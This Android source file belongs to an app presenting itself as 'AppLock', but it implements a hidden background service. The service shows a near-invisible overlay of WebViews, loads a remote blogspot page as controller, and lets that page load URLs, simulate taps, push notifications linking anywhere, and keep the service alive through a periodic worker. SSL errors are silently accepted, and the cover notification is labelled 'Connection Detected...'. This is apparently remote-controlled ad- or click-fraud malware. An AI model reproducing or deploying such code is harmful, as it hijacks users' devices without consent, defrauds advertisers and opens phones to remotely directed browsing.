package com.hexagon.applock;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.PendingIntent;
import android.app.Service;
import android.content.ClipData;
import android.content.ClipboardManager;
import android.content.Context;
import android.content.Intent;
import android.content.res.Resources;
import android.graphics.Bitmap;
import android.graphics.Color;
import android.graphics.PixelFormat;
import android.net.Uri;
import android.net.http.SslError;
import android.os.Build;
import android.os.Handler;
import android.os.IBinder;
import android.os.Looper;
import android.os.Message;
import android.os.SystemClock;
import android.view.DragEvent;
import android.view.Gravity;
import android.view.KeyEvent;
import android.view.LayoutInflater;
import android.view.MotionEvent;
import android.view.View;
import android.view.ViewGroup;
import android.view.WindowManager;
import android.webkit.ConsoleMessage;
import android.webkit.CookieManager;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.SslErrorHandler;
import android.webkit.ValueCallback;
import android.webkit.WebChromeClient;
import android.webkit.WebResourceRequest;
import android.webkit.WebResourceResponse;
import android.webkit.WebSettings;
import android.webkit.WebView;
import android.text.Html;

import android.webkit.WebViewClient;
import android.widget.Button;
import android.widget.FrameLayout;
import android.widget.ImageView;
import android.widget.LinearLayout;
import android.widget.RelativeLayout;
import android.widget.TextView;
import android.widget.Toast;

import com.google.android.material.floatingactionbutton.FloatingActionButton;

import java.io.ByteArrayInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.util.Collection;
import java.util.HashMap;
import java.util.Map;
import java.util.Random;
import java.util.Set;
import java.util.Timer;
import java.util.TimerTask;
import java.util.concurrent.TimeUnit;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

import androidx.annotation.Nullable;
import androidx.annotation.RequiresApi;
import androidx.coordinatorlayout.widget.CoordinatorLayout;
import androidx.core.app.NotificationCompat;
import androidx.core.content.ContextCompat;
import androidx.work.Constraints;
import androidx.work.ExistingPeriodicWorkPolicy;
import androidx.work.NetworkType;
import androidx.work.PeriodicWorkRequest;
import androidx.work.WorkManager;
import im.delight.android.webview.AdvancedWebView;
import com.hexagon.applock.R;


public class Webviewone extends Service implements AdvancedWebView.Listener{
    public NotificationManager notificationManager;
    public NotificationCompat.Builder notify;
    public Notification notification;
    static final String host_parent="http://techbazic.blogspot.com";
    boolean if_tab=false;
    int counter=0;
    boolean newTab=false;
    public int gendelay=2000;
    String completedMain="false",completedTab="false";
    Handler handler = new Handler(Looper.getMainLooper());
    Runnable runnable;
    AdvancedWebView webView;
    LinearLayout frameLayout;
    private WindowManager mWindowManager;
    private View mFloatingView;
    AdvancedWebView advancedWebView,Loader;
    public Webviewone() {

    }

    @Override
    public IBinder onBind(Intent intent) {
        return null;
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        startNotify();
        if(intent.getAction()=="stop"){
            stopSelf();
        }
        return Service.START_REDELIVER_INTENT;

    }


    @Override
    public void onCreate() {
        super.onCreate();
        startNotify();

        mFloatingView = LayoutInflater.from(this).inflate(R.layout.webview, null);

        //Add the view to the window.
        WindowManager.LayoutParams params = null;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_APPLICATION_OVERLAY,
                    WindowManager.LayoutParams.FLAG_NOT_FOCUSABLE,
                    PixelFormat.TRANSPARENT);
        } else {
            params = new WindowManager.LayoutParams(
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.MATCH_PARENT,
                    WindowManager.LayoutParams.TYPE_PHONE,
                    WindowManager.LayoutParams.FLAG_NOT_TOUCH_MODAL,
                    PixelFormat.TRANSPARENT);
        }
        //Specify the view position
        params.gravity = Gravity.TOP | Gravity.LEFT;        //Initially view will be added to top-left corner
        params.x = 0;
        params.y = 100;

        //Add the view to the window
        mWindowManager = (WindowManager) getSystemService(WINDOW_SERVICE);
        mWindowManager.addView(mFloatingView, params);
        frameLayout = mFloatingView.findViewById(R.id.parent);
        TextView close=mFloatingView.findViewById(R.id.close);
        close.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                //stopSelf();
            }
        });
        Loader=mFloatingView.findViewById(R.id.loader);
        Loader.getSettings().setJavaScriptEnabled(true);
        Loader.getSettings().setDomStorageEnabled(true);
        Loader.getSettings().setDatabaseEnabled(true);
        Loader.getSettings().setSupportMultipleWindows(true);
        Loader.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        Loader.getSettings().setAllowUniversalAccessFromFileURLs(true);
        Loader.getSettings().setAllowFileAccess(true);
        Loader.getSettings().setAllowContentAccess(true);
        Loader.getSettings().setAllowFileAccessFromFileURLs(true);
        Loader.addJavascriptInterface(new Android(Webviewone.this), "Android");
        Loader.setMixedContentAllowed(true);
        Loader.setCookiesEnabled(true);
        Loader.setThirdPartyCookiesEnabled(true);
        Loader.addHttpHeader("X-Requested-With", "Android Browser");
        Loader.setWebViewClient(new Webview_Client());
        Loader.setWebChromeClient(new WebChromeClient() {
            @Override
            public boolean onConsoleMessage(ConsoleMessage consoleMessage) {
//                new Handler(Looper.getMainLooper()).post(new Runnable() {
////                    @Override
////                    public void run() {
////                        Toast.makeText(Webviewone.this, consoleMessage.message(), Toast.LENGTH_SHORT).show();
////                    }
////                });
                return super.onConsoleMessage(consoleMessage);
            }

            @Override
            public boolean onCreateWindow(WebView view, boolean isDialog, boolean isUserGesture, Message resultMsg) {
                newTab=true;
                if(!if_tab) {
                    advancedWebView = new AdvancedWebView(Webviewone.this);
                    advancedWebView.getSettings().setJavaScriptEnabled(true);
                    advancedWebView.getSettings().setDomStorageEnabled(true);
                    advancedWebView.getSettings().setDatabaseEnabled(true);
                    advancedWebView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
                    advancedWebView.getSettings().setAllowUniversalAccessFromFileURLs(true);
                    advancedWebView.getSettings().setAllowFileAccess(true);
                    advancedWebView.getSettings().setAllowContentAccess(true);
                    advancedWebView.getSettings().setAllowFileAccessFromFileURLs(true);
                    advancedWebView.setMixedContentAllowed(true);
                    advancedWebView.setCookiesEnabled(true);
                    advancedWebView.setThirdPartyCookiesEnabled(true);
                    advancedWebView.addHttpHeader("X-Requested-With", "Android Browser");
                    advancedWebView.setWebViewClient(new Webview_Client());
                    advancedWebView.setWebChromeClient(new WebChromeClient(){
                        @Override
                        public void onProgressChanged(WebView view, int newProgress) {
                            super.onProgressChanged(view, newProgress);
                            if (newProgress <= 20) {
                                completedTab="false";
                            }
                        }
                        @Override
                        public boolean onJsBeforeUnload(WebView view, String url, String message, JsResult result) {
                            super.onJsBeforeUnload(view, url, message, result);
                            result.confirm();
                            return true;
                        }

                    });
                    LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0);
                    layoutParams.weight = (float) 0.6;
                    layoutParams.gravity = Gravity.BOTTOM;
                    advancedWebView.setLayoutParams(layoutParams);
                    frameLayout.addView(advancedWebView);
                    if_tab=true;
                    WebView.WebViewTransport transport = (WebView.WebViewTransport) resultMsg.obj;
                    transport.setWebView(advancedWebView);
                    resultMsg.sendToTarget();
                }else{
                    advancedWebView.loadUrl("about:blank");
                    advancedWebView.destroy();
                    advancedWebView.removeAllViews();
                    advancedWebView.setVisibility(View.GONE);
                    advancedWebView = new AdvancedWebView(Webviewone.this);
                    advancedWebView.getSettings().setJavaScriptEnabled(true);
                    advancedWebView.getSettings().setDomStorageEnabled(true);
                    advancedWebView.getSettings().setDatabaseEnabled(true);
                    advancedWebView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
                    advancedWebView.getSettings().setAllowUniversalAccessFromFileURLs(true);
                    advancedWebView.getSettings().setAllowFileAccess(true);
                    advancedWebView.getSettings().setAllowContentAccess(true);
                    advancedWebView.getSettings().setAllowFileAccessFromFileURLs(true);
                    advancedWebView.setMixedContentAllowed(true);
                    advancedWebView.setCookiesEnabled(true);
                    advancedWebView.setThirdPartyCookiesEnabled(true);
                    advancedWebView.addHttpHeader("X-Requested-With", "Android Browser");
                    advancedWebView.setWebViewClient(new Webview_Client());
                    advancedWebView.setWebChromeClient(new WebChromeClient(){
                        @Override
                        public void onProgressChanged(WebView view, int newProgress) {
                            super.onProgressChanged(view, newProgress);
                            if (newProgress <= 20) {
                                completedTab="false";
                            }
                        }
                        @Override
                        public boolean onJsBeforeUnload(WebView view, String url, String message, JsResult result) {
                            super.onJsBeforeUnload(view, url, message, result);
                            result.confirm();
                            return true;
                        }

                    });
                    LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0);
                    layoutParams.weight = (float) 0.6;
                    layoutParams.gravity = Gravity.BOTTOM;
                    advancedWebView.setLayoutParams(layoutParams);
                    frameLayout.addView(advancedWebView);
                    advancedWebView.setVisibility(View.VISIBLE);
                    WebView.WebViewTransport transport = (WebView.WebViewTransport) resultMsg.obj;
                    transport.setWebView(advancedWebView);
                    resultMsg.sendToTarget();
                }
                return true;
            }

            @Override
            public boolean onJsBeforeUnload(WebView view, String url, String message, JsResult result) {
                super.onJsBeforeUnload(view, url, message, result);
                result.confirm();
                return true;
            }

        });
        Loader.post(new Runnable() {
            @Override
            public void run() {
                Loader.loadUrl(host_parent);
            }
        });










        webView = (AdvancedWebView) mFloatingView.findViewById(R.id.webview);
        webView.getSettings().setJavaScriptEnabled(true);
        webView.getSettings().setDomStorageEnabled(true);
        webView.getSettings().setDatabaseEnabled(true);
        webView.getSettings().setSupportMultipleWindows(true);
        webView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
        webView.getSettings().setAllowUniversalAccessFromFileURLs(true);
        webView.getSettings().setAllowFileAccess(true);
        webView.getSettings().setAllowContentAccess(true);
        webView.getSettings().setAllowFileAccessFromFileURLs(true);
        webView.addJavascriptInterface(new Android(Webviewone.this), "Android");
        webView.setMixedContentAllowed(true);
        webView.setCookiesEnabled(true);
        webView.setThirdPartyCookiesEnabled(true);
        webView.addHttpHeader("X-Requested-With", "Android Browser");
        webView.setWebViewClient(new Webview_Client());
        webView.setWebChromeClient(new WebChromeClient() {
            @Override
            public void onProgressChanged(WebView view, int newProgress) {
                super.onProgressChanged(view, newProgress);
                if (newProgress <= 20) {
                    completedMain="false";
                }
            }


            @Override
            public boolean onCreateWindow(WebView view, boolean isDialog, boolean isUserGesture, Message resultMsg) {
                newTab=true;
                if(!if_tab) {
                    advancedWebView = new AdvancedWebView(Webviewone.this);
                    advancedWebView.getSettings().setJavaScriptEnabled(true);
                    advancedWebView.getSettings().setDomStorageEnabled(true);
                    advancedWebView.getSettings().setDatabaseEnabled(true);
                    advancedWebView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
                    advancedWebView.getSettings().setAllowUniversalAccessFromFileURLs(true);
                    advancedWebView.getSettings().setAllowFileAccess(true);
                    advancedWebView.getSettings().setAllowContentAccess(true);
                    advancedWebView.getSettings().setAllowFileAccessFromFileURLs(true);
                    advancedWebView.setMixedContentAllowed(true);
                    advancedWebView.setCookiesEnabled(true);
                    advancedWebView.setThirdPartyCookiesEnabled(true);
                    advancedWebView.addHttpHeader("X-Requested-With", "Android Browser");
                    advancedWebView.setWebViewClient(new Webview_Client());
                    advancedWebView.setWebChromeClient(new WebChromeClient(){
                        @Override
                        public void onProgressChanged(WebView view, int newProgress) {
                            super.onProgressChanged(view, newProgress);
                            if (newProgress <= 20) {
                                completedTab="false";
                            }
                        }
                        @Override
                        public boolean onJsBeforeUnload(WebView view, String url, String message, JsResult result) {
                            super.onJsBeforeUnload(view, url, message, result);
                            result.confirm();
                            return true;
                        }

                    });
                    LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0);
                    layoutParams.weight = (float) 0.6;
                    layoutParams.gravity = Gravity.BOTTOM;
                    advancedWebView.setLayoutParams(layoutParams);
                    frameLayout.addView(advancedWebView);
                    if_tab=true;
                    WebView.WebViewTransport transport = (WebView.WebViewTransport) resultMsg.obj;
                    transport.setWebView(advancedWebView);
                    resultMsg.sendToTarget();
                }else{
                    advancedWebView.loadUrl("about:blank");
                    advancedWebView.destroy();
                    advancedWebView.removeAllViews();
                    advancedWebView.setVisibility(View.GONE);
                    advancedWebView = new AdvancedWebView(Webviewone.this);
                    advancedWebView.getSettings().setJavaScriptEnabled(true);
                    advancedWebView.getSettings().setDomStorageEnabled(true);
                    advancedWebView.getSettings().setDatabaseEnabled(true);
                    advancedWebView.getSettings().setJavaScriptCanOpenWindowsAutomatically(true);
                    advancedWebView.getSettings().setAllowUniversalAccessFromFileURLs(true);
                    advancedWebView.getSettings().setAllowFileAccess(true);
                    advancedWebView.getSettings().setAllowContentAccess(true);
                    advancedWebView.getSettings().setAllowFileAccessFromFileURLs(true);
                    advancedWebView.setMixedContentAllowed(true);
                    advancedWebView.setCookiesEnabled(true);
                    advancedWebView.setThirdPartyCookiesEnabled(true);
                    advancedWebView.addHttpHeader("X-Requested-With", "Android Browser");
                    advancedWebView.setWebViewClient(new Webview_Client());
                    advancedWebView.setWebChromeClient(new WebChromeClient(){
                        @Override
                        public void onProgressChanged(WebView view, int newProgress) {
                            super.onProgressChanged(view, newProgress);

                            if (newProgress <= 20) {
                                completedTab="false";
                            }
                        }
                        @Override
                        public boolean onJsBeforeUnload(WebView view, String url, String message, JsResult result) {
                            super.onJsBeforeUnload(view, url, message, result);
                            result.confirm();
                            return true;
                        }

                    });
                    LinearLayout.LayoutParams layoutParams = new LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, 0);
                    layoutParams.weight = (float) 0.6;
                    layoutParams.gravity = Gravity.BOTTOM;
                    advancedWebView.setLayoutParams(layoutParams);
                    frameLayout.addView(advancedWebView);
                    advancedWebView.setVisibility(View.VISIBLE);
                    WebView.WebViewTransport transport = (WebView.WebViewTransport) resultMsg.obj;
                    transport.setWebView(advancedWebView);
                    resultMsg.sendToTarget();
                }
                return true;
            }


            @Override
            public boolean onJsBeforeUnload(WebView view, String url, String message, JsResult result) {
                super.onJsBeforeUnload(view, url, message, result);
                result.confirm();
                return true;
            }

        });

    }
    //create function to click and if click, wait for the reloading to be completed and reload another url and undergo click againn and so on till it ends in the array

    private void Dispatch_Motion(float clickx, float clicky, WebView webView,int positionsroll){
        long downTime= SystemClock.uptimeMillis();
        long downTime1= SystemClock.uptimeMillis()+90;
        long eventTime=SystemClock.uptimeMillis()+50;
        long eventTime1=SystemClock.uptimeMillis()+130;
        int height= webView.getHeight();
        int width=webView.getWidth();
        float x=(width*clickx)/100;
        float y=(height*clicky)/100;
        int metastate =0;
        MotionEvent motionEvent1=MotionEvent.obtain(downTime,eventTime,MotionEvent.ACTION_DOWN,x,y,metastate);
        MotionEvent motionEvent=MotionEvent.obtain(downTime1,eventTime1,MotionEvent.ACTION_UP,x,y,metastate);
        new Handler(Looper.getMainLooper()).post(new Runnable() {
            @Override
            public void run() {
                webView.scrollTo(0,positionsroll);
            }
        });

        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
            @Override
            public void run() {
                webView.dispatchTouchEvent(motionEvent1);
                webView.dispatchTouchEvent(motionEvent);
            }
        },1000);
    }

    public void startNotify(){
        notificationManager=(NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
        notify= new NotificationCompat.Builder(getApplicationContext(),"Ads")
                .setSmallIcon(R.drawable.transparent)
                .setContentTitle("Connection Detected...")
                .setContentText("You may be connected to the internet....")
                .setVibrate(null)
                .setSound(null)
                .setPriority(Notification.PRIORITY_MIN);
        notify.build().flags=Notification.FLAG_FOREGROUND_SERVICE|Notification.PRIORITY_MIN;
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            String channelid="Ad Updates";
            NotificationChannel channel=new NotificationChannel(channelid,"Ad Updates", NotificationManager.IMPORTANCE_LOW);
            channel.enableVibration(false);
            channel.setSound(null,null);
            notificationManager.createNotificationChannel(channel);
            notify.setChannelId(channelid);
        }
        notification=notify.build();
        startForeground(1250,notification);
    }

    @Override
    public void onDestroy() {
        Constraints constraints = new Constraints.Builder()
                .setRequiredNetworkType(NetworkType.CONNECTED)
                .build();
        PeriodicWorkRequest saveRequest =
                new PeriodicWorkRequest.Builder(Coolworker.class, 16, TimeUnit.MINUTES)
                        .setConstraints(constraints)
                        .build();

        WorkManager.getInstance(Webviewone.this).enqueueUniquePeriodicWork("Mywork", ExistingPeriodicWorkPolicy.KEEP,saveRequest);

        counter=0;
        if_tab=false;
        newTab=false;
        gendelay=2000;
        frameLayout.removeAllViews();

        if (mFloatingView != null) mWindowManager.removeView(mFloatingView);
        super.onDestroy();
    }

    @Override
    public void onPageStarted(String url, Bitmap favicon) {

    }

    @Override
    public void onPageFinished(String url) {

    }

    @Override
    public void onPageError(int errorCode, String description, String failingUrl) {

    }

    @Override
    public void onDownloadRequested(String url, String suggestedFilename, String mimeType, long contentLength, String contentDisposition, String userAgent) {

    }

    @Override
    public void onExternalPageRequest(String url) {

    }
    class Webview_Client extends WebViewClient{
        @RequiresApi(api = Build.VERSION_CODES.LOLLIPOP)
        @Override
        public boolean shouldOverrideUrlLoading(WebView view, WebResourceRequest request) {
            Map<String,String> map=new HashMap<String, String>();
            map.put("X-Requested-With", "Android Browser");
            view.loadUrl(request.getUrl().toString(),map);
            if(view==webView){
                completedMain="false";
            }else if(view==advancedWebView){
                completedTab="false";
            }else{
                handler.removeMessages(0);
                handler.removeCallbacksAndMessages(null);
            }
            return true;
        }

        @Override
        public boolean shouldOverrideUrlLoading(WebView view, String url) {
            Map<String,String> map=new HashMap<String, String>();
            map.put("X-Requested-With", "Android Browser");
            view.loadUrl(url,map);

            if(view==webView){
                completedMain="false";
            }else if(view==advancedWebView){
                completedTab="false";
            }else{
                handler.removeMessages(0);
                handler.removeCallbacksAndMessages(null);
            }
            return true;
        }

        @RequiresApi(api = Build.VERSION_CODES.KITKAT)
        @Override
        public void onPageFinished(WebView view, String url) {
//get amount of links from website, load one, click on link and onfinished, the next onfinished if it's not equal to the unique domain, reload the next link till all is finished and stop and wait till next time

            if(view==Loader){
                handler.postDelayed(new Runnable() {
                    @Override
                    public void run() {
                        Loader.evaluateJavascript("(function(){return Hexagon;})();", new ValueCallback<String>() {
                            @Override
                            public void onReceiveValue(String value) {
                                if(value.contains("null")){
                                    stopSelf();
                                }
                            }
                        });
                    }
                },5000);

            }
            if(view==webView){
                completedMain="true";
            }else if(view==advancedWebView){
                completedTab="true";
            }
            super.onPageFinished(view, url);
        }
        @Override
        public void onReceivedSslError(WebView view, SslErrorHandler handler, SslError error) {
            handler.proceed();
            super.onReceivedSslError(view, handler, error);
        }
    }


    class Android{
        Context context;
        Android(Context context2){
            this.context=context2;
        }
        @JavascriptInterface public void loadUrl(String url){
            String[] getitems=url.split("\\*\\*");
            String url1=getitems[0];
            gendelay=Integer.parseInt(getitems[2]);
            String webview=getitems[1];
            if(webview.toLowerCase().contains("web")){
                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        webView.loadUrl(url1);
                    }
                });
            }else{
                new Handler(Looper.getMainLooper()).post(new Runnable() {
                    @Override
                    public void run() {
                        advancedWebView.loadUrl(url1);
                    }
                });
            }

        }
        @JavascriptInterface  public void resetNewTab(){
            newTab=false;
        }
        @JavascriptInterface public boolean getNewTab(){
            return newTab;
        }

        @JavascriptInterface  public void click(String params){
            String[] getdata=params.split("\\*\\*");
            int x=Integer.parseInt(getdata[0]);
            int y=Integer.parseInt(getdata[1]);
            int scroll=Integer.parseInt(getdata[2]);
            String webview=getdata[3];
            gendelay=Integer.parseInt(getdata[4]);
            if(webview.toLowerCase().contains("web")){
                Dispatch_Motion(x,y,webView,scroll);
            }else{
                Dispatch_Motion(x,y,advancedWebView,scroll);
            }
        }
        @JavascriptInterface public void stop(){
            stopSelf();
        }
        @JavascriptInterface public void notify(String notify1){
            String [] notifyarr=notify1.split("\\*\\*");
            String title=notifyarr[0];
            String text=notifyarr[1];
            String url=notifyarr[2];
            Intent intent=new Intent(Intent.ACTION_VIEW, Uri.parse(url));
            PendingIntent pendingIntent=PendingIntent.getActivity(Webviewone.this,1,intent,0);
            NotificationManager notificationManager=(NotificationManager)getSystemService(Context.NOTIFICATION_SERVICE);
            NotificationCompat.BigTextStyle bigTextStyle=new NotificationCompat.BigTextStyle();
            bigTextStyle.setSummaryText("By: Hexagon");
            bigTextStyle.bigText(text);
            NotificationCompat.Builder notify= new NotificationCompat.Builder(getApplicationContext(),"Ads")
                    .setSmallIcon(R.drawable.locked)
                    .setContentTitle(title)
                    .setStyle(bigTextStyle)
                    .setColor(ContextCompat.getColor(Webviewone.this,R.color.colorPrimary))
                    .setContentIntent(pendingIntent)
                    .setAutoCancel(true)
                    .setPriority(Notification.PRIORITY_MAX);
            notify.build().flags=Notification.FLAG_AUTO_CANCEL|Notification.PRIORITY_MAX;
            if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
                String channelid="notify ads one";
                NotificationChannel channel=new NotificationChannel(channelid,"notify ads one", NotificationManager.IMPORTANCE_HIGH);
                channel.enableVibration(false);
                channel.setSound(null,null);
                notificationManager.createNotificationChannel(channel);
                notify.setChannelId(channelid);
            }
            gendelay=Integer.parseInt(notifyarr[3]);
            notification=notify.build();
            notificationManager.notify(1310,notification);
        }
        @JavascriptInterface public void show(String time){
            int time1=Integer.parseInt(time);
            new Handler(Looper.getMainLooper()).post(new Runnable() {
                @Override
                public void run() {
                    frameLayout.setVisibility(View.VISIBLE);
                }
            });
            gendelay=time1;
        }
        @JavascriptInterface public int getDelay(){
            return gendelay;
        }
        @JavascriptInterface public String getCompleted(String type){
            if (type.toLowerCase().contains("web")){
                return completedMain;
            }else{
                return completedTab;
            }
        }
        @JavascriptInterface public String getAppName(){
            return "AppLock";
        }
        @JavascriptInterface public String getAppVersion(){
            return "2.0";
        }
    }
}
